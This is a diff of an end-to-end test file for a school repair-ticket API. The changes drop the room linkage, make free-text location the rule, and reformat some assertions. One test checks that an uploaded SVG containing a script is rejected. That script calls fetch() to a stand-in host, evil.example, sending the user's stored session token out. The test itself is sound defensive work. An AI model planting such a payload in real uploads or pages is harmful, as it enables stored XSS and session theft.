@@ -21,7 +21,6 @@ const PNG_BYTES = Buffer.from(
 
 interface RepairTicketResponse {
   id: string;
-  roomId: string | null;
   location: string;
   category: string;
   description: string;
@@ -46,7 +45,6 @@ describe('Repairs (e2e)', () => {
   let otherUserToken: string;
   let adminToken: string;
   let maintenanceToken: string;
-  let roomId: string;
   const createdUploadPaths: string[] = [];
   // See bookings.e2e-spec.ts for why NotificationsService is mocked at the
   // SMTP-send boundary rather than not exercised at all.
@@ -85,18 +83,10 @@ describe('Repairs (e2e)', () => {
     userToken = await tokenFor('reporter@school.edu.tw', Role.USER);
     otherUserToken = await tokenFor('bystander@school.edu.tw', Role.USER);
     adminToken = await tokenFor('repairadmin@school.edu.tw', Role.ADMIN);
-    maintenanceToken = await tokenFor('repairmaint@school.edu.tw', Role.MAINTENANCE);
-
-    const room = await prisma.room.create({
-      data: {
-        name: 'B202 討論室',
-        capacity: 4,
-        equipment: [],
-        imageUrl: '/uploads/rooms/x.png',
-        requiresApproval: false,
-      },
-    });
-    roomId = room.id;
+    maintenanceToken = await tokenFor(
+      'repairmaint@school.edu.tw',
+      Role.MAINTENANCE,
+    );
   });
 
   beforeEach(() => {
@@ -106,7 +96,6 @@ describe('Repairs (e2e)', () => {
   afterAll(async () => {
     await prisma.auditLogEntry.deleteMany({});
     await prisma.repairTicket.deleteMany({});
-    await prisma.room.deleteMany({ where: { id: roomId } });
     await prisma.repairCategory.deleteMany({
       where: { name: { startsWith: 'Test Category' } },
     });
@@ -218,7 +207,7 @@ describe('Repairs (e2e)', () => {
 
   it('rejects an SVG upload masquerading as a photo (stored XSS vector)', () => {
     const svgPayload = Buffer.from(
-      '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch(\'https://evil.example/collect?t=\'+localStorage.getItem(\'meetfix_token\'))</script></svg>',
+      "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>fetch('https://evil.example/collect?t='+localStorage.getItem('meetfix_token'))</script></svg>",
     );
     return apiRequest(app)
       .post('/repairs')
@@ -265,28 +254,19 @@ describe('Repairs (e2e)', () => {
       .expect(400);
   });
 
-  it('a Repair Ticket tied to a real Room defaults its location to the Room name', async () => {
+  it('a roomId field submitted alongside a Repair Ticket is ignored — location is always free text (#19)', async () => {
     const res = await apiRequest(app)
       .post('/repairs')
       .set('Authorization', `Bearer ${userToken}`)
-      .field('roomId', roomId)
+      .field('roomId', 'some-room-id')
+      .field('location', '手動輸入的地點')
       .field('category', '硬體設備')
       .field('description', '電視螢幕無法開機')
       .expect(201);
 
     const body = res.body as RepairTicketResponse;
-    expect(body.roomId).toBe(roomId);
-    expect(body.location).toBe('B202 討論室');
-  });
-
-  it('rejects a Repair Ticket tied to a Room that does not exist', () => {
-    return apiRequest(app)
-      .post('/repairs')
-      .set('Authorization', `Bearer ${userToken}`)
-      .field('roomId', 'not-a-real-room')
-      .field('category', '硬體設備')
-      .field('description', 'test')
-      .expect(404);
+    expect(body).not.toHaveProperty('roomId');
+    expect(body.location).toBe('手動輸入的地點');
   });
 
   describe('Repair Ticket processing (Maintenance)', () => {
@@ -318,18 +298,14 @@ describe('Repairs (e2e)', () => {
         .set('Authorization', `Bearer ${maintenanceToken}`)
         .send({ status: 'IN_PROGRESS' })
         .expect(200);
-      expect((started.body as RepairTicketResponse).status).toBe(
-        'IN_PROGRESS',
-      );
+      expect((started.body as RepairTicketResponse).status).toBe('IN_PROGRESS');
 
       const completed = await apiRequest(app)
         .patch(`/repairs/${id}`)
         .set('Authorization', `Bearer ${maintenanceToken}`)
         .send({ status: 'COMPLETED' })
         .expect(200);
-      expect((completed.body as RepairTicketResponse).status).toBe(
-        'COMPLETED',
-      );
+      expect((completed.body as RepairTicketResponse).status).toBe('COMPLETED');
     });
 
     it('ADMIN can also move a ticket through the workflow', async () => {
@@ -378,9 +354,9 @@ describe('Repairs (e2e)', () => {
         .set('Authorization', `Bearer ${maintenanceToken}`)
         .send({ status: 'IN_PROGRESS', adminReply: '已預約零件，明日到場處理' })
         .expect(200);
-      expect((res.body as RepairTicketResponse & { adminReply: string }).adminReply).toBe(
-        '已預約零件，明日到場處理',
-      );
+      expect(
+        (res.body as RepairTicketResponse & { adminReply: string }).adminReply,
+      ).toBe('已預約零件，明日到場處理');
     });
 
     it('404s when updating a Repair Ticket that does not exist', () => {
